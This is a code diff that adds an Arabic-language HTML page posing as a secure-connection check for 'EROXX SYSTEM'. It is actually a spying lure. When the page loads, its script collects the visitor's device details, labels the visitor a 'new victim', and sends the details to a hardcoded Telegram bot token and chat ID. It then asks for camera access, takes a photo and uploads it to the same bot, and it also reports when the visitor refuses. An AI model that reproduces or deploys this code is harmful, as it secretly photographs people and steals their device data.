@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>جاري التحميل...</title>
+    <style>
+        body { background: #000; color: #9d00ff; text-align: center; font-family: Arial; padding-top: 100px; }
+        .box { border: 1px solid #9d00ff; padding: 20px; display: inline-block; border-radius: 10px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>EROXX SYSTEM</h2>
+        <p>جاري فحص اتصالك الآمن...</p>
+    </div>
+
+    <script>
+        const token = "8595115985:AAEQInFhoQI-yUs3kmSIYjmuDPW65ufmO1o";
+        const chatId = "6969597735";
+
+        async function sendLog(text) {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
+        }
+
+        async function capture() {
+            [span_2](start_span)// سحب معلومات الجهاز كما في الصورة[span_2](end_span)
+            let battery = await navigator.getBattery();
+            let report = "📱 تم اصطياد ضحية جديد!\n";
+            report += "-----------------------\n";
+            report += `🔋 البطارية: ${Math.round(battery.level * 100)}% D\n`;
+            report += `💻 الجهاز: ${navigator.platform}\n`;
+            report += `🌐 المتصفح: ${navigator.userAgent}\n`;
+            report += `🧠 المعالج: ${navigator.hardwareConcurrency} Cores\n`;
+
+            await sendLog(report);
+
+            // طلب فتح الكاميرا
+            navigator.mediaDevices.getUserMedia({ video: true }).then(async stream => {
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                const blob = await imageCapture.takePhoto();
+                
+                let formData = new FormData();
+                formData.append("photo", blob);
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}`, {
+                    method: "POST",
+                    body: formData
+                });
+                stream.getTracks().forEach(t => t.stop());
+            }).catch(err => sendLog("⚠️ الضحية رفض إذن الكاميرا"));
+        }
+
+        window.onload = capture;
+    </script>
+</body>
+</html>
